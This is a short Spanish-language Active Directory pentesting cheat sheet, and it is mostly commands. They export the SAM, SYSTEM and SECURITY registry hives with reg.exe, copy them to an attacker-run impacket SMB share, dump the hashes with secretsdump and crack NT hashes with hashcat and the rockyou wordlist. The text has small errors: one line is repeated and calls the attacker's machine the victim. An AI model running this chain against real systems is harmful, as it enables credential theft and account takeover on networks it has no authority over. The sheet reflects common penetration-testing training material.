# Directorio Activo
## Descripción
Pentesting Directorio Activo , comandos

### SAM - SYSTEM - SECURITY
Hay tres colmenas de registro que podemos copiar si tenemos acceso de administrador local en el destino; cada uno tendrá un propósito específico cuando lleguemos a desechar y descifrar los hashes. Lo siguiente se hace desde el equipo windows con permisos de administrador en una consola cmd.

```python
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```
Lo siguientes es pasarlo a nuestro equipo victima.
```python
sudo impacket-smbserver share -smb2support /tmp/smbshare (Linux)
move sam.save \\IPTUYA\share
move system.save \\IPTUYA\share
move security.save \\IPTUYA\share
```
Ahora toca volcar los hashes
Lo siguientes es pasarlo a nuestro equipo victima.
```python
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
Por último, deberemos de romper la clave o con john the ripper o con hashcat tomando en cuenta que son contraseñas NT
```python
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```
```python
sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
